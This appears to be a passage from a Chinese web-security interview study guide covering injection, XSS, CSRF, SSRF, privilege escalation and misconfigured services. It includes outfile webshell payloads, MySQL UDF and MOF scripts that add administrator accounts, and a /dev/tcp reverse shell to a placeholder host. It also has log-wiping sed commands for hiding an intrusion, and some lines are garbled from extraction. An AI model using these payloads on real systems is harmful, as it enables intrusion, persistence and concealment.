头注⼊点</h4><p>UA</p><p>REFERER</p><p>COOKIE</p><p>IP</p><h4 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h4><p>盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注 </p><p>⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。</p><p>⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延 </p><p>时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。 </p><h4 id="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"><a href="#⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理" class="headerlink" title="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"></a>⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理</h4><p>在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如 </p><p>addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊</p><p>数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 \ 转义符号会被前⾯的 bf 带着 “吃掉”，单引号由此逃逸出来可以 </p><p>⽤来闭合语句。 </p><p>2、在哪⾥编码 </p><p>3、根本原因 </p><p>character_set_client(客户端的字符集) 和 character_set_connection(连接层的字符集) 不同, 或转换函数如，iconv、 </p><p>mb_convert_encoding 使⽤不当。 </p><p>4、解决办法 </p><p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转 </p><p>义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。 </p><p>5、SQL ⾥⾯只有 update 怎么利⽤ </p><p>先理解这句 SQL</p><p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’$id’</p><p>如果此 SQL 被修改成以下形式，就实现了注⼊ </p><p>a、修改 homepage 值为 <a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3</p><p>之后 SQL 语句变为UPDATE user SET password=’mypass’, homepage=’<a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3’ WHERE id=’$id’</p><p>userlevel 为⽤户级别 </p><p>b、修改 password 值为 mypass)’ WHERE username=’admin’#</p><p>之后 SQL 语句变为</p><p>UPDATE user SET password=’MD5(mypass)’ WHERE username=’admin’#)’, homepage=’$homepage’ WHERE id=’$id’</p><p>c、修改 id 值为 ‘ OR username=’admin’ 之后 SQL 语句变为</p><p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’’ OR username=’admin’</p><h4 id="九、SQL-如何写-shell-单引被过滤怎么办"><a href="#九、SQL-如何写-shell-单引被过滤怎么办" class="headerlink" title="九、SQL 如何写 shell / 单引被过滤怎么办"></a>九、SQL 如何写 shell / 单引被过滤怎么办</h4><p>写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数</p><p>`<a href="http://127.0.0.1:81/sqli.php?id=1">http://127.0.0.1:81/sqli.php?id=1</a> into outfile ‘C:\wamp64\www\phpinfo.php’ FIELDS TERMINATED BY ‘&lt;?php phpinfo</p><p>(); ?&gt;’`</p><p>`<a href="http://127.0.0.1:81/sqli.php?id=-1">http://127.0.0.1:81/sqli.php?id=-1</a> union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile ‘C:\w</p><p>amp64\www\phpinfo.php’`</p><p>宽字节注⼊ </p><p>1、代替空格的⽅法</p><p>%0a、%0b、%a0 等</p><p>/**/ 等注释符</p><p>&lt;&gt;</p><p>2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别 </p><p>5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p><p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。 </p><h4 id="⼗、XSS"><a href="#⼗、XSS" class="headerlink" title="⼗、XSS"></a>⼗、XSS</h4><p>1、XSS 原理 </p><p>反射型 </p><p>⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击 </p><p>成功</p><p>存储型 </p><p>存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。 </p><p>DOM 型</p><p>通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。 </p><p>2、DOM 型和反射型的区别 </p><p>反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 </p><p>payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM- </p><p>based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数 </p><p>据。根本区别在我看来是输出点的不同。 </p><p>3、DOM 型和 XSS ⾃动化测试或⼈⼯测试 </p><p>⼈⼯测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: </p><p>后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经 </p><p>过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输 </p><p>出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内</p><p>容容。</p><p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同 </p><p>类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。</p><p>4、如何快速发现 XSS 位置 </p><p>5、对于 XSS 怎么修补建议 </p><p>输⼊点检查：对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格 </p><p>式检查。针对输⼊点的检查最好放在服务器端实现。 </p><p>输出点检查：对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ </p><p>HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放 </p><p>在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数</p><p>字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的</p><p>⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。 </p><p>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。 </p><p>6、XSS 蠕⾍的⽣产条件 </p><p>正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产 </p><p>⽣。</p><p>不⼀定需要存储型 XSS </p><h4 id="⼗⼀、CSRF"><a href="#⼗⼀、CSRF" class="headerlink" title="⼗⼀、CSRF"></a>⼗⼀、CSRF</h4><p>1、CSRF 原理 </p><p>CSRF 是跨站请求伪造攻击，由客户端发起, 是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认 </p><p>2、防御验证 Referer </p><p>添加 token </p><p>3、token 和 referer 做横向对⽐，谁安全等级⾼？ </p><p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并 </p><p>且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则) </p><p>4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题</p><p>对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的 </p><p>⽩名单中，正则规则应当写完善。 </p><p>5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？ </p><p>引⽤⼀段请教前辈的回答： </p><p>针对token的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击 </p><p>信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站 </p><p>很多跳转登录的都依赖token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了 </p><p>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过⽐如抢红包业务之类的 </p><h4 id="⼗二、SSRF"><a href="#⼗二、SSRF" class="headerlink" title="⼗二、SSRF"></a>⼗二、SSRF</h4><p>SSRF(Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。 </p><p>⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它 </p><p>相连⽽与外⽹隔离的内部系统） </p><p>SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指 </p><p>定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。 </p><p>1、监测SSRF 漏洞的验证⽅法： </p><p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送 </p><p>的，从⽽来判断是否存在 SSRF 漏洞 </p><p>2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存">www.baidu.com/xxx.php?image=（地址）的就可能存</a> 在 SSRF 漏洞 </p><p>2、SSRF 漏洞的成因 防御 绕过 </p><p>成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀ </p><p>持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP， </p><p>IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。 </p><h4 id="⼗三、上传"><a href="#⼗三、上传" class="headerlink" title="⼗三、上传"></a>⼗三、上传</h4><h5 id="1、⽂件上传漏洞原理"><a href="#1、⽂件上传漏洞原理" class="headerlink" title="1、⽂件上传漏洞原理"></a>1、⽂件上传漏洞原理</h5><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动 </p><p>态脚本⽂件 </p><h5 id="2、常⻅的上传绕过⽅式"><a href="#2、常⻅的上传绕过⽅式" class="headerlink" title="2、常⻅的上传绕过⽅式"></a>2、常⻅的上传绕过⽅式</h5><p>前端 js 验证：禁⽤ js/burp 改包 </p><p>⼤⼩写 </p><p>双重后缀名 </p><p>过滤绕过 pphphp-&gt;php </p><h5 id="3、防护⽂件上传⽬录设置为不可执⾏"><a href="#3、防护⽂件上传⽬录设置为不可执⾏" class="headerlink" title="3、防护⽂件上传⽬录设置为不可执⾏"></a>3、防护⽂件上传⽬录设置为不可执⾏</h5><p>使⽤⽩名单判断⽂件上传类型 </p><p>⽤随机数改写⽂件名和路径 </p><h5 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h5><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p><h4 id="⼗四、⽂件包含"><a href="#⼗四、⽂件包含" class="headerlink" title="⼗四、⽂件包含"></a>⼗四、⽂件包含</h4><h5 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h5><p>引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include() 等函数通过动态变量的⽅式引⼊需要包含的⽂件； </p><p>⽤户能够控制该动态变量。 </p><h5 id="2、导致⽂件包含的函数"><a href="#2、导致⽂件包含的函数" class="headerlink" title="2、导致⽂件包含的函数"></a>2、导致⽂件包含的函数</h5><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(), </p><p>java.io.Fil-eReader(), … ASP：include fifile, include virtual, </p><h5 id="3、本地⽂件包含"><a href="#3、本地⽂件包含" class="headerlink" title="3、本地⽂件包含"></a>3、本地⽂件包含</h5><p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞 </p><h4 id="⼗五、逻辑漏扫"><a href="#⼗五、逻辑漏扫" class="headerlink" title="⼗五、逻辑漏扫"></a>⼗五、逻辑漏扫</h4><h5 id="1、⾦融⾏业常⻅逻辑漏洞"><a href="#1、⾦融⾏业常⻅逻辑漏洞" class="headerlink" title="1、⾦融⾏业常⻅逻辑漏洞"></a>1、⾦融⾏业常⻅逻辑漏洞</h5><p>单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺ </p><p>⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。 </p><h4 id="⼗五、中间⼈攻击"><a href="#⼗五、中间⼈攻击" class="headerlink" title="⼗五、中间⼈攻击"></a>⼗五、中间⼈攻击</h4><p>中间 攻 （缺 ） 的攻 客户 与 务 之间在 的 中缺 造成的中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞 </p><p>防御中间⼈攻击的⽅案通常基于⼀下⼏种技术 </p><ol><li>公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务 </li></ol><p>器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证</p><ol start="2"><li>延迟测试 </li></ol><p>使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费 </p><p>了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。 </p><ol start="3"><li>使⽤其他形式的密钥交换形式</li></ol><h5 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h5><p>原理</p><p>每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC</p><p>地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过</p><p>ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关 </p><p>系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 </p><p>防护</p><ol><li><p>在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC </p></li><li><p>在⽹关绑定主机 MAC 与 IP 地址</p></li><li><p>使⽤ ARP 防⽕墙 </p></li></ol><h4 id="⼗六、DDOS1、DDOS-原理"><a href="#⼗六、DDOS1、DDOS-原理" class="headerlink" title="⼗六、DDOS1、DDOS 原理"></a>⼗六、DDOS1、DDOS 原理</h4><p>利⽤合理的请求造成资源过载，导致服务不可⽤ </p><h5 id="syn-洪流的原理"><a href="#syn-洪流的原理" class="headerlink" title="syn 洪流的原理"></a>syn 洪流的原理</h5><p>伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造 </p><p>的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 </p><p>30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多 </p><p>的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇 </p><p>理睬正常的连接请求，导致拒绝服务。 </p><h5 id="CC-攻击原理"><a href="#CC-攻击原理" class="headerlink" title="CC 攻击原理"></a>CC 攻击原理</h5><p>对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。 </p><p>2、DOSS 防护 </p><p>SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每 </p><p>个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地 </p><p>址的包将被丢弃。 </p><h4 id="⼗七、提权"><a href="#⼗七、提权" class="headerlink" title="⼗七、提权"></a>⼗七、提权</h4><p>MySQL 两种提权⽅式 </p><p>udf 提权, mof 提权 </p><p>MySQL_UDF 提取 </p><p>要求: 1. ⽬标系统是 Windows(Win2000,XP,Win2003)；2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 </p><p>insert 和 delete 权限以创建和抛弃函数 3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 </p><p>安装⽬录 的 \ ⽂件夹 才能创建⾃定义函数 以再 ⾥输⼊MYSQL 安装⽬录下的 lib\plugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊ select @@basedir show variables</p><p>like ‘%plugins%’ 寻找 mysql 安装路径 提权: </p><p>使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string </p><p>soname ‘导出的 DLL 路径’；</p><p>create function cmdshell returns string soname ‘udf.dll’</p><p>select cmdshell(‘net user arsch arsch /add’);</p><p>select cmdshell(‘net localgroup administrators arsch /add’);</p><p>drop function cmdshell;</p><p>该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 lib\plugin ⽂件 </p><p>夹，然后将 udf.dll ⽂件导出到该⽬录即可。 </p><p>MySQL mof 提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line"></span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line"></span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line"></span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line"></span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line"></span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line"></span><br><span class="line">ScriptText &#x3D;</span><br><span class="line"></span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn &#x2F;add\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;instance of __FilterToConsumerBinding</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line"></span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的第 18 ⾏的命令，上传前请⾃⼰更改。 </p><p>2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure><p>执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连 </p><p>接之就 ok 了。 </p><h4 id="⼗⼋、特殊漏洞"><a href="#⼗⼋、特殊漏洞" class="headerlink" title="⼗⼋、特殊漏洞"></a>⼗⼋、特殊漏洞</h4><p>1、Struts2-045 </p><p>2、Redis 未授权 </p><p>产⽣原因 </p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可 </p><p>以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis </p><p>的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务 </p><p>器</p><p>利⽤条件和⽅法 </p><p>条件: </p><p>a、redis 服务以 root 账户运⾏ </p><p>b、redis ⽆密码或弱密码进⾏认证c、redis 监听在 0.0.0.0 公⽹上 </p><p>⽅法: </p><p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 </p><p>b、上传 SSH 公钥获得 SSH 登录权限 </p><p>c、通过 crontab 反弹 shell </p><p>d、slave 主从模式利⽤ </p><p>修复</p><p>密码验证 </p><p>降权运⾏ </p><p>限制 ip / 修改端⼝ </p><p>3、Jenkins 未授权访问 </p><p>4、MongoDB 未授权访问 </p><p>攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令</p><p>println “ifconfig -a”.execute().text 执⾏⼀些系统命令, 利⽤ wget 下载 webshell </p><p>开启 MongoDB 服务时不添加任何参数时, 默认是没有权限验证的, ⽽且可以远程访问数据库，登录的⽤户可以通过默认 </p><p>端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。 </p><p>防护</p><p>为 MongoDB 添加认证：1)MongoDB 启动时添加–auth 参数 2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 </p><p>db.addUser(“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth(“root”,“123456”) #验证下是否添加成 </p><p>功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 </p><p>以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊</p><p>参数 –bind_ip 127.0.0.1 或在 / etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1 </p><p>5、Memcache 未授权访问 </p><p>Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很 </p><p>容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 </p><p>利⽤</p><p>a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在 </p><p>memcached 未授权访问漏洞。 </p><p>b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在 </p><p>漏洞加固 </p><p>a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤ </p><p>SASL 认证</p><p>6、FFMPEG 本地⽂件读取 </p><p>原理</p><p>通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞， </p><p>m3u8 头，偏移量，加密。 </p><h4 id="⼗九、安全知识"><a href="#⼗九、安全知识" class="headerlink" title="⼗九、安全知识"></a>⼗九、安全知识</h4><p>1、WEB </p><p>常⻅ WEB 开发 JAVA 框架</p><p>STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归 </p><p>获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 </p><p>我也记不清楚。。。然后这部分就结束了 </p><p>同源策略 </p><p>同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝， </p><p>以上有不同时即不同源。 </p><p>Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯</p><p>涉及到 Jsonp 的安全攻防内容 </p><p>JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。 </p><p>攻击⻚⾯</p><p>JSON 劫持，跨域劫持敏感信息，⻚⾯类似于</p><p>function wooyun(v){</p><p>alert(v.username);</p><p>}</p><p> </p><script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script> <p>Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道 </p><p>创宇的 JSONP 安全攻防技术。 </p><p>2、PHP </p><p>php 中命令执⾏涉及到的函数 </p><p>代码执⾏：eval()、assert()、popen()、system()、exec()、shell_exec()、 </p><p>passthru(),pcntl_exec(),call_user_func_array(),create_function()⽂件读取：fifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), </p><p>fgets(),parse_ini_fifile(),show_source(),fifile() 等 </p><p>命令执⾏：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() </p><p>安全模式下绕过 php 的 disable fuction </p><p>DL 函数，组件漏洞，环境变量。 </p><p>PHP 弱类型</p><p>== 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较 </p><p>如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏</p><p>0e 开头的字符串等于 0 </p><p>3、数据库 </p><p>各种数据库⽂件存放的位置 </p><p>mysql:</p><p>/usr/local/mysql/data/</p><p>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</p><p>oracle: $ORACLE_BASE/oradata/$ORACLE_SID/</p><p>4、系统</p><p>如何清理⽇志如何清理⽇志 </p><p>meterpreter: clearev</p><p>⼊侵 Linux 服务器后需要清除哪些⽇志？ </p><p>web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除 </p><p>e.g. sed -i -e ‘/192.169.1.1/d’ </p><p>history 命令的清除，也是对~/.bash_history 进⾏定向清除 </p><p>wtmp ⽇志的清除，/var/log/wtmp </p><p>登录⽇志清除 /var/log/secure </p><p>LINUX </p><p>查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p><p>netstat -antp<code></code>ss -l</p><p>ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。 </p><p>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么?</p><p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p><p>通过 Linux 系统的 / proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</p><p>ls /proc</p><p>系统信息，硬件信息，内核版本，加载的模块，进程 </p><p>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。</p><p>/etc/ssh/sshd config iptables 配置/etc/ssh/sshd___config iptables 配置 </p><p>如何⼀条命令查看⽂件内容最后⼀百⾏</p><p>tail -n 100 filename</p><p>Windows </p><p>如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。 </p><p>5、密码学 </p><p>AES／DES 的具体⼯作步骤 </p><p>RSA 算法 </p><p>加密: </p><p>密⽂＝明⽂ ^EmodN </p><p>RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程 